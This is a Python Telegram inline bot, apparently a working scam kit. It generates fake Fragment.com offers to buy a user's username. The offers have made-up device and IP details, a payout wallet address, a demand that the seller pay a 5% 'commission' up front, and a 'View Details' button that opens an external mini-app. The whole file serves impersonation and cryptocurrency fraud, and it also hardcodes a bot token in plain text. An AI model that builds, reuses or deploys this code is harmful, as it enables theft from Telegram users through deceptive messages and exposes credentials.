import os
import time
import urllib.request
import json
import asyncio
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import threading
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, MessageEntity, WebAppInfo
from telegram.ext import Application, InlineQueryHandler, ContextTypes

# Configuration
BOT_TOKEN = '7975400880:AAFMJ5ya_sMdLLMb7OjSbMYiBr3IhZikE6c'
PORT = int(os.getenv('PORT', 10000))
WEBHOOK_URL = "https://telegram-bot-vic3.onrender.com"
WEBAPP_URL = "https://myminiapp.onrender.com"  # 🔗 URL de votre site web

print(f"🤖 Inline Fragment Deal Generator v4.7")
print(f"🔑 Token: ✅")
print(f"🌐 Port: {PORT}")
print(f"🔗 Webhook: {WEBHOOK_URL}")
print(f"📱 Web App: {WEBAPP_URL}")

# Variables globales
app = None
event_loop = None

def get_ton_price():
    """Récupère le prix du TON en temps réel"""
    try:
        # API CoinGecko plus fiable
        url = "https://api.coingecko.com/api/v3/simple/price?ids=the-open-network&vs_currencies=usd"
        with urllib.request.urlopen(url, timeout=10) as response:
            data = json.loads(response.read().decode())
            price = float(data['the-open-network']['usd'])
            print(f"💰 Prix TON récupéré: ${price:.4f}")
            return price
    except Exception as e:
        print(f"❌ Erreur API CoinGecko: {e}")
        # Fallback vers DIA API
        try:
            url = "https://api.diadata.org/v1/assetQuotation/Ton/0x0000000000000000000000000000000000000000"
            with urllib.request.urlopen(url, timeout=5) as response:
                data = json.loads(response.read().decode())
                price = float(data.get('Price', 5.50))
                print(f"💰 Prix TON (fallback): ${price:.4f}")
                return price
        except Exception as e2:
            print(f"❌ Erreur API DIA: {e2}")
            # Prix par défaut si toutes les APIs échouent
            return 5.50

def generate_fragment_message(username, ton_amount):
    """Génère le message Fragment avec formatage identique au bot original"""
    
    # Prix TON actuel - récupération en temps réel
    ton_price = get_ton_price()
    
    # Calculs
    price = float(ton_amount)
    price_usd = price * ton_price
    commission = price * 0.05
    commission_usd = commission * ton_price
    
    # Adresse wallet
    wallet_address = "UQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XDPR"
    
    # Message Fragment - IDENTIQUE au bot original
    fragment_message = f"""We have received a purchase request for your username @{username} via Fragment.com. Below are the transaction details:

• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)
• Commission: 💎{commission:g} (${commission_usd:.2f} USD)

Please note that a 5% commission is charged to the seller prior to accepting the deal. This ensures a secure and efficient transaction process.

Additional Information:
• Device: Safari on macOS  
• IP Address: 103.56.72.245
• Wallet: {wallet_address}

Important:
• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
• If you choose not to proceed, simply ignore this message."""
    
    # Création des entités pour le formatage
    entities = []
    
    # 1. Offer Amount en gras
    offer_text = f"• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)"
    offer_start = fragment_message.find(offer_text)
    if offer_start != -1:
        entities.append(MessageEntity(
            type=MessageEntity.BOLD,
            offset=offer_start,
            length=len(offer_text)
        ))
    
    # 2. Commission en gras
    commission_text = f"• Commission: 💎{commission:g} (${commission_usd:.2f} USD)"
    commission_start = fragment_message.find(commission_text)
    if commission_start != -1:
        entities.append(MessageEntity(
            type=MessageEntity.BOLD,
            offset=commission_start,
            length=len(commission_text)
        ))
    
    # 3. Premier point Important en gras
    important_text1 = "• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible."
    important_start1 = fragment_message.find(important_text1)
    if important_start1 != -1:
        entities.append(MessageEntity(
            type=MessageEntity.BOLD,
            offset=important_start1,
            length=len(important_text1)
        ))
    
    # 4. Deuxième point Important en gras
    important_text2 = "• If you choose not to proceed, simply ignore this message."
    important_start2 = fragment_message.find(important_text2)
    if important_start2 != -1:
        entities.append(MessageEntity(
            type=MessageEntity.BOLD,
            offset=important_start2,
            length=len(important_text2)
        ))
    
    # 5. Wallet cliquable - LONGUEUR CORRECTE (48 caractères: UQ...PR)
    wallet_start = fragment_message.find(wallet_address)
    if wallet_start != -1:
        entities.append(MessageEntity(
            type=MessageEntity.TEXT_LINK,
            offset=wallet_start,
            length=48,  # Longueur exacte de UQ...PR (48 caractères)
            url=f"https://tonviewer.com/{wallet_address}"
        ))
        print(f"🔗 Wallet link: position {wallet_start}, longueur 48 caractères")
    
    # 📱 BOUTON STARTAPP - Ouvre l'app via le bot Telegram
    startapp_params = f"user={username}&price={price:g}"
    startapp_url = f"https://t.me/DirectOfferNotification_bot?startapp={startapp_params}"
    keyboard = InlineKeyboardMarkup([[
        InlineKeyboardButton(
            "View Details", 
            url=startapp_url
        )
    ]])
    
    print(f"🔗 StartApp URL générée: {startapp_url}")
    
    return fragment_message, entities, keyboard

async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gestionnaire pour les reqêtes inline"""
    try:
        query = update.inline_query.query.strip()
        print(f"🔍 Requête inline reçue: '{query}'")
        
        if not query:
            print("❌ Requête vide, ignorée")
            await update.inline_query.answer([])
            return
        
        # Séparer username et montant
        parts = query.split()
        if len(parts) != 2:
            print(f"❌ Format invalide: {len(parts)} parties (attendu: 2)")
            await update.inline_query.answer([])
            return
        
        username = parts[0].replace('@', '')
        try:
            ton_amount = float(parts[1])
        except ValueError:
            print(f"❌ Montant invalide: {parts[1]}")
            await update.inline_query.answer([])
            return
        
        # Validation
        if len(username) < 5 or len(username) > 32:
            print(f"❌ Username invalide (longueur): {username}")
            await update.inline_query.answer([])
            return
        
        if ton_amount <= 0 or ton_amount > 1000000:
            print(f"❌ Montant invalide (valeur): {ton_amount}")
            await update.inline_query.answer([])
            return
        
        print(f"✅ Génération message pour @{username} - {ton_amount} TON")
        
        # Génération du message
        message_text, entities, keyboard = generate_fragment_message(username, ton_amount)
        
        # Résultat inline
        from telegram import InlineQueryResultArticle, InputTextMessageContent
        import uuid
        
        result = InlineQueryResultArticle(
            id=str(uuid.uuid4()),
            title=f"Fragment Deal: @{username}",
            description=f"💎 {ton_amount:g} TON (${ton_amount * get_ton_price():.2f} USD)",
            input_message_content=InputTextMessageContent(
                message_text=message_text,
                entities=entities
            ),
            reply_markup=keyboard
        )
        
        # Envoi de la réponse
        await update.inline_query.answer([result], cache_time=0)
        print(f"✅ Message généré et envoyé pour @{username}")
        
    except Exception as e:
        print(f"❌ Erreur dans inline_query_handler: {e}")

class WebhookHandler(BaseHTTPRequestHandler):
    """Gestionnaire webhook HTTP simple"""
    
    def do_POST(self):
        """Gestion des requêtes POST"""
        global app, event_loop
        
        try:
            if self.path != f'/{BOT_TOKEN}':
                self.send_response(404)
                self.end_headers()
                return
            
            # Lecture des données
            content_length = int(self.headers.get('content-length', 0))
            post_data = self.rfile.read(content_length)
            
            # Parse JSON
            update_data = json.loads(post_data.decode('utf-8'))
            
            # Traitement asynchrone
            if app and event_loop:
                asyncio.run_coroutine_threadsafe(
                    process_update(update_data),
                    event_loop
                )
            
            # Réponse OK
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"ok":true}')
            
        except Exception as e:
            print(f"❌ Erreur webhook: {e}")
            self.send_response(500)
            self.end_headers()
    
    def do_GET(self):
        """Page de status simple"""
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        
        status = f"✅ Bot Status: Online\n🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S UTC')}\n📱 Web App (Intégrée): {WEBAPP_URL}"
        self.wfile.write(status.encode('utf-8'))
    
    def log_message(self, format, *args):
        """Désactiver les logs HTTP"""
        pass

async def process_update(update_data):
    """Traitement des updates Telegram"""
    global app
    
    try:
        if app:
            update = Update.de_json(update_data, app.bot)
            if update:
                await app.process_update(update)
    except Exception as e:
        print(f"❌ Erreur traitement update: {e}")

def run_webhook_server():
    """Démarre le serveur webhook"""
    try:
        server = HTTPServer(('0.0.0.0', PORT), WebhookHandler)
        print(f"🌐 Serveur webhook démarré sur le port {PORT}")
        server.serve_forever()
    except Exception as e:
        print(f"❌ Erreur serveur webhook: {e}")

async def setup_bot():
    """Configuration du bot"""
    global app, event_loop
    
    try:
        # Création de l'application
        app = Application.builder().token(BOT_TOKEN).build()
        
        # Ajout du gestionnaire inline
        app.add_handler(InlineQueryHandler(inline_query_handler))
        
        # Initialisation
        await app.initialize()
        await app.start()
        
        # Configuration du webhook
        webhook_url = f"{WEBHOOK_URL}/{BOT_TOKEN}"
        await app.bot.set_webhook(url=webhook_url)
        
        print(f"✅ Bot initialisé avec webhook: {webhook_url}")
        
        # Garde l'event loop actif
        event_loop = asyncio.get_event_loop()
        
        # Démarrage du serveur webhook dans un thread séparé
        webhook_thread = threading.Thread(target=run_webhook_server, daemon=True)
        webhook_thread.start()
        
        # Attente infinie
        while True:
            await asyncio.sleep(1)
            
    except Exception as e:
        print(f"❌ Erreur setup bot: {e}")
        raise

def main():
    """Fonction principale"""
    try:
        print("🚀 Démarrage du bot inline...")
        
        # Démarrage asynchrone
        asyncio.run(setup_bot())
        
    except KeyboardInterrupt:
        print("🛑 Arrêt du bot...")
    except Exception as e:
        print(f"❌ Erreur critique: {e}")

if __name__ == '__main__':
    main()
